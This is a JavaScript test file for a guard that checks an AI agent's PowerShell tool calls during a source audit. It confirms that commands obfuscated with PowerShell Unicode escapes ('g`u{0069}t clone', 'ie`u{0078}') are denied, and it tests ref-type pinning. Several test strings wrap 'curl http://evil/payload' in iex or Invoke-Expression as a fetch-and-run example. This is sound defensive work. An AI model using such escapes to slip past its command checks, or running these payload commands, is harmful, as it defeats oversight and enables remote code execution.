// __tests__/unicode-escape-ref-binding.test.mjs
//
// Anchor tests for security rationale:
//   Security case — PowerShell 7+ `u{HHHH} Unicode escape bypassed
//                  detection (`g`u{0069}t` → `git`)
//   Security case — refType conflict not enforced (release_tag pinned
//                  but branch_or_tag accepted)
import { test } from "node:test";
import assert from "node:assert/strict";

import { inspectToolCall, activateAudit, deactivateAudit } from "../enforcement.mjs";
import { safeListTreeHandler } from "../safeWrappers/safeListTreeHandler.mjs";

const BUILD_ROOT = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck": "/tmp/zerotrust-sourcecheck";
const CLONE_PATH = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck\\octocat-Hello-World-7fd1a60": "/tmp/zerotrust-sourcecheck/octocat-Hello-World-7fd1a60";

function denyTest(name, command, mode = "audit_source") {
    test(name, () => {
        const sid = "unicode-escape-ref-binding-" + Math.random().toString(36).slice(2, 8);
        deactivateAudit(sid);
        activateAudit({
            sessionId: sid,
            buildPath: BUILD_ROOT,
            mode,
            expectedClonePath: CLONE_PATH,
        });
        const r = inspectToolCall({
            sessionId: sid,
            toolName: "powershell",
            toolArgs: { command },
        });
        assert.equal(r.decision, "deny",
            `expected deny, got: ${r.decision} | reason: ${r.reason || ""}`);
        deactivateAudit(sid);
    });
}

// ----: PS 7+ `u{HHHH} Unicode escape ----

// `u{0069} = `i`. So `g`u{0069}t` = `git`.
denyTest("unicode-escape-ref-binding: PS 7+ `g`u{0069}t clone <url> <dest>` (Unicode i escape) is DENIED",
    "g`u{0069}t clone https://github.com/x/y " + CLONE_PATH);
denyTest("unicode-escape-ref-binding: PS 7+ `g`u{0069}`u{0074} clone <url> <dest>` (multiple unicode escapes) is DENIED",
    "g`u{0069}`u{0074} clone https://github.com/x/y " + CLONE_PATH);
// `u{0070} = `p`. So `n`u{0070}m` = `npm`.
denyTest("unicode-escape-ref-binding: PS 7+ `n`u{0070}m install foo` is DENIED",
    "n`u{0070}m install foo");
// `u{0078} = `x`. So `ie`u{0078}` = `iex`.
denyTest("unicode-escape-ref-binding: PS 7+ `ie`u{0078} 'foo'` (Unicode x in iex) is DENIED",
    "ie`u{0078} 'curl http://evil/payload'");
// `u{0067} = `g`. So leading `u{0067}it = git.
denyTest("unicode-escape-ref-binding: PS 7+ ``u{0067}it clone <url> <dest>` (leading Unicode escape) is DENIED",
    "`u{0067}it clone https://github.com/x/y " + CLONE_PATH);
denyTest("unicode-escape-ref-binding: PS 7+ `Invok`u{0065}-Expression 'foo'` is DENIED",
    "Invok`u{0065}-Expression 'curl http://evil/payload'");

// Sanity: a plain `u{0069} not preceded by anything special should also fire
// since `u{0069}` decodes to `i` (and we still see `iex` if the rest is `ex`).
denyTest("unicode-escape-ref-binding: PS 7+ ``u{0069}ex 'foo'` (full-iex from leading escape) is DENIED",
    "`u{0069}ex 'curl http://evil/payload'");

// ----: refType conflict ----

test("unicode-escape-ref-binding: safe_list_tree refuses refType conflict (release_tag vs branch_or_tag)", async () => {
    const sid = "unicode-escape-ref-binding-rt-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
        owner: "octocat",
        repo: "hello-world",
        ref: "baseline.0",
        refType: "release_tag",
    });
    // Caller supplies the same ref but a DIFFERENT refType.
    const r = await safeListTreeHandler(
        {
            owner: "octocat",
            repo: "hello-world",
            ref: "baseline.0",
            refType: "branch_or_tag",
        },
        { sessionId: sid },
    );
    assert.equal(r.resultType, "failure");
    assert.match(r.textResultForLlm, /refType|refType pinned|namespace/i);
    deactivateAudit(sid);
});

test("unicode-escape-ref-binding: safe_list_tree allows matching refType (sanity)", async () => {
    // Should not refuse when refType matches the audit's pinned one.
    const sid = "unicode-escape-ref-binding-rt-ok-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
        owner: "octocat",
        repo: "hello-world",
        ref: "baseline.0",
        refType: "release_tag",
    });
    const r = await safeListTreeHandler(
        {
            owner: "octocat",
            repo: "hello-world",
            ref: "baseline.0",
            refType: "release_tag",
        },
        { sessionId: sid },
    );
    // Will fail at the network layer (we don't have a real baseline.0 tag for
    // octocat/hello-world), but should NOT fail with the refType conflict.
    if (r.resultType === "failure") {
        assert.doesNotMatch(r.textResultForLlm, /refType.*does not match/i,
            `unexpected refType conflict on matching refType: ${r.textResultForLlm}`);
    }
    deactivateAudit(sid);
});
